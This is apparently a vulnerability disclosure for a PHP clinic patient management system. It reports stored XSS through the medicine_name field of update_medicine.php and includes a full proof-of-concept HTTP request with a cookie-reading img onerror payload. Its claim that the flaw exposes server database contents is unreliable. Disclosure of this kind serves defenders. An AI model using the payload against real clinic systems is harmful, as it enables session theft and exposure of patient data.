## Clinic's Patient Management System has XSS vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/update_medicine.php
## describe
An unrestricted XSS attack exists in the inventory management system. The parameters that can be controlled are as follows: medicine_name, without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.
## code analysis
The medicine_name parameter in update_medicine.php is controlled and can directly execute the payload in xss.

<img width="1147" alt="image" src="https://github.com/user-attachments/assets/020adcb6-1ad6-4329-9f21-a2f292a2013d">
<img width="1253" alt="image" src="https://github.com/user-attachments/assets/d7af0874-a6d6-4cfd-a77d-0bb4b35e87f2">


xss via parameter medicine_name
POC
```
POST /pms/update_medicine.php?id=257 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://localhost
Connection: close
Referer: http://localhost/pms/update_medicine.php?id=257
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

hidden_id=257&medicine_name=23<img src=1 onerror=alert(document.cookie)>&save_medicine=
```
<img width="1214" alt="image" src="https://github.com/user-attachments/assets/34fc2b17-9097-46de-97e1-9ba3ab510d86">

<img width="1329" alt="image" src="https://github.com/user-attachments/assets/726c92bd-5810-4001-99a3-31793f447edf">








